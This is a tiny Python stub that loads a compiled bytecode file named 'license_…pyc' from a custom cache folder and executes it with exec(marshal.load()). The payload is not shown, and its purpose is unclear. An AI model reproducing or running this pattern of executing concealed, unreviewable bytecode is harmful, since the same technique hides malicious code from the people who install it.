
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'license_92b1fc9a8128451e8a2a3e2fb0b7fc23.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
